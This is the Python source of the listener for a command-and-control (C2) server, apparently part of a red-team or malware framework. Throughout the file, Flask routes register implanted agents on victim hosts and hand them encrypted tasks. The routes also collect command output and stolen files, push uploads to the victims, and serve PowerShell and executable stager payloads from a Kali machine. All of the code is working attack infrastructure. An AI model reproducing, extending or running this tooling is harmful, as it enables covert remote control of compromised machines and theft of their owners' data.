import string
import random
from util import *
import flask
import sys 
from multiprocessing import Process
import threading
import logging
from AgentHelpers import *
from agents import *
import os
import base64
import secrets
import hashlib
from Crypto.Cipher import AES

class Listener():

    def __init__(self, host, port, name):
        self.host = host
        self.port = port
        self.id   = name
        self.Path = "data/listeners/{}/".format(self.id)
        self.agentsPath = "{}agents/".format(self.Path)
        self.agentsPath_download_files = "/home/kali/Desktop/C2_download/"
        self.agentsPath_upload_files = "/home/kali/Desktop/C2_uploads/"
        
        
        self.app = flask.Flask(__name__)
        
        if os.path.exists(self.Path) == False:
            os.mkdir(self.Path)
        if os.path.exists(self.agentsPath) == False:
            os.mkdir(self.agentsPath)
        if os.path.exists(self.agentsPath_download_files) == False:
            os.mkdir(self.agentsPath_download_files)
        if os.path.exists(self.agentsPath_upload_files) == False:
            os.mkdir(self.agentsPath_upload_files)

        def decode_this(encrypted_data: bytes, agents_name :str) -> bytes:
            iv_list = [13, 77, 137, 47, 126, 97, 75, 99, 145, 34, 62, 202, 134, 23, 94, 58]
            with open("data/listeners/" + self.id + "/agents/" + agents_name + "/secret", "r") as f:
                key = f.read().strip()  # ← important : supprime les \n potentiels

            iv = bytes(iv_list)
            key_bytes = hashlib.sha256(key.encode()).digest()
            cipher = AES.new(key_bytes, AES.MODE_CTR, nonce=b'', initial_value=iv)
            plaintext = cipher.decrypt(encrypted_data)
            return plaintext

        def encode_this(data: str, agents_name: str) -> str:
            iv_list = [13, 77, 137, 47, 126, 97, 75, 99, 145, 34, 62, 202, 134, 23, 94, 58]
            iv = bytes(iv_list)

            # Load and derive key
            with open(f"data/listeners/{self.id}/agents/{agents_name}/secret", "r") as f:
                key = f.read().strip()
            key_bytes = hashlib.sha256(key.encode()).digest()

            # Step 1: base64 encode the data (same as encode(fileContent) in Nim)
            b64_encoded = base64.b64encode(data.encode("utf-8"))

            # Step 2: encrypt the base64-encoded bytes
            cipher = AES.new(key_bytes, AES.MODE_CTR, nonce=b'', initial_value=iv)
            encrypted_bytes = cipher.encrypt(b64_encoded)

            # Step 3: base64 encode the encrypted bytes (to return a string)
            final_output = base64.b64encode(encrypted_bytes).decode("utf-8")

            return final_output.strip()

        @self.app.route("/reg", methods=['POST'])
        def registerAgent():
            name     = ''.join(random.choice(string.ascii_uppercase) for i in range(6))
            remoteip = flask.request.remote_addr
            hostname = flask.request.form.get("name")
            success("Agent {} checked in. Host : {} | IP: {} .".format(name,hostname,remoteip))
            
            
            writeToDB(agentsDB,Agent(name,self.id,remoteip,hostname))
            return (name, 200)
        @self.app.route("/tasks/<name>", methods=['GET'])
        def serveTasks(name):
            if os.path.exists("{}/{}/tasks".format(self.agentsPath,name)):
                with open("{}/{}/tasks".format(self.agentsPath,name), "r") as f:
                    task = f.read()
                encrypted_task = encode_this(task,name)
                clearAgentTasks(name)
                print(task)
                return(encrypted_task.strip(),200)
            else:
                
                return("",204)

        @self.app.route("/secret/<name>", methods=['GET'])
        def serveSecret(name): 
            alphabet = string.ascii_letters + string.digits
            key = ''.join(secrets.choice(alphabet) for _ in range(32))
            
            
            if (os.path.exists("{}/{}/secret".format(self.agentsPath,name)) == False):
                with open("data/listeners/"+self.id+"/agents/"+name+"/secret","w") as f:
                    f.write(key)
                #print("Secret served for Agent {}: {}".format(name, key.strip()))
                
                return (key.strip(),200)
            else:
                return ("",404)    
            
        @self.app.route("/download/<name>", methods=['GET'])
        def servefiletodl(name):
            if os.path.exists("{}/{}/download".format(self.agentsPath,name)):
                with open("{}/{}/download".format(self.agentsPath,name), "r") as f:
                    path = f.read()
                encrypted_path = encode_this(path,name)
                clearAgentdownload(name)
                return(encrypted_path,200)
            else:
                return("",204)
        @self.app.route("/uploads/<name>", methods=['POST'])
        def receivefile(name):
            encoded_file = flask.request.form.get("file")
            original_path = flask.request.form.get("path")

            if not encoded_file or not original_path or not name:
                return "", 500

            name_file = os.path.basename(original_path)

            try:
                encrypted_data = base64.b64decode(encoded_file)
                decrypted_base64 = decode_this(encrypted_data, name)  # encore du base64 ici
                original = base64.b64decode(decrypted_base64)         # ici, c’est les vraies données
            except Exception as e:
                return "",500

            full_path = os.path.join(self.agentsPath_download_files, name_file)

            try:
                decoded_text = original.decode("utf-8")
                with open(full_path, "w", encoding="utf-8") as f:
                    f.write(decoded_text)
            except UnicodeDecodeError:
                with open(full_path, "wb") as f:
                    f.write(original)

            displayResults(name, name_file)
            return "", 200
        @self.app.route("/ftrans/<name>", methods=['GET'])
        def file_transfer(name):
            upload_flag_path = os.path.join(self.agentsPath, name, "upload")

            if os.path.exists(upload_flag_path):
                with open(upload_flag_path, "r") as f:
                    path = f.read().strip()

                clearAgentUpload(name)

                full_file_path = os.path.join(self.agentsPath_upload_files, path)

                # Try 1 : est-ce que le fichier existe vraiment
                if os.path.exists(full_file_path):
                    try:
                        # Try 2 : lecture en texte
                        with open(full_file_path, "r", encoding="utf-8") as f:
                            file_content = f.read()
                        file_encoded = base64.b64encode(file_content.encode("utf-8")).decode("utf-8")

                    except Exception as e_text:
                        try:
                            # Try 3 : lecture en binaire si lecture texte échoue
                            with open(full_file_path, "rb") as f:
                                file_bytes = f.read()
                            file_encoded = base64.b64encode(file_bytes).decode("utf-8")

                        except Exception as e_bin:
                            print(f"Erreur lecture fichier binaire {full_file_path}: {e_bin}")
                            
                            return "", 204

                    payload = path + "mon|file" + file_encoded
                    encrypted_data = encode_this(payload, name)
                    return encrypted_data, 200

                else:
                    print(f"File {path} doesn't exist...")
                    
                    return "", 204

            else:
                
                return "", 204
                

        @self.app.route("/results/<name>", methods=['POST'])
        def receiveResults(name):
            results = flask.request.form.get("result")

            encrypted_data = base64.b64decode(results)
            decrypted_base64 = decode_this(encrypted_data, name)
            original_bytes = base64.b64decode(decrypted_base64)
            try:
                original_text = original_bytes.decode("utf-8")  # ← ici, tu récupères les vrais sauts de ligne
            except UnicodeDecodeError:
                original_text = original_bytes.decode("utf-8", errors="replace")
            displayResults(name,original_text)
            return("",200)

        @self.app.route("/rb", methods=['GET'])
        def serveRB():
            file_path = "/home/kali/Documents/rb"
    
            try:
                with open(file_path, "r") as file:
                    content = file.read()
                return (content, 200)  
            except :
                return("error",200) 
        @self.app.route("/exe", methods=['GET'])
        def serveEXE():
            file_path = "/home/kali/Documents/exe"
    
            try:
                with open(file_path, "r") as file:
                    content = file.read()
                return (content, 200)  
            except : 
                return("error",200) 
        @self.app.route("/powershell", methods=['GET'])
        def serve_powershell():
            file_path = "/home/kali/Documents/powershell"
        
            try:
                with open(file_path, "r") as file:
                    content = file.read()
                return (content, 200)  
            except :
                return("error",200) 
    def run(self):
        '''log = logging.getLogger('werkzeug')
        log.setLevel(logging.ERROR)
        self.app.logger.disabled = True'''
        self.app.run(port=self.port, host=self.host)
        


    def start(self):
        success(f"Starting listener {self.id} on {self.host}:{self.port}")
        self.server = Process(target=self.run)
        cli = sys.modules['flask.cli']
        cli.show_server_banner = lambda *x: None 
        self.daemon = threading.Thread(name = self.id,
                                       target = self.server.start,
                                       args = ())
        self.daemon.daemon = True
        self.daemon.run()

        self.isRunning = True
    
    def stop(self):
        self.server.terminate()
        self.isRunning = False
